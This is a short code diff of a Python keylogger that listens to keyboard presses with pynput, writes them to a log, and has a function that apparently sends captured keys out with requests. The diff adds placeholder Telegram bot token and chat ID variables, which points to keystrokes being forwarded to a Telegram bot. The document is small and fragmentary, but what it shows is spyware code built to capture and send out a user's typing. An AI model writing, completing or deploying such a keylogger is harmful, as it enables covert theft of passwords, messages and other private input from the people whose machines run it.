@@ -2,6 +2,12 @@ from pynput import keyboard
 import requests
 
 
+telegram_bot_token = "REPLACE_YOUR_TOKEN"
+chatID = "your_chat_id_here"
+
+
+
+
 def OnPress(key) : # Define the function for handling key presses
     
 # write the pressed key to a log file
@@ -27,6 +33,7 @@ def sendingkeys(message):
 with keyboard.Listener (
     on_press = OnPress) as listener :
     listener.join()
+
 
 
 
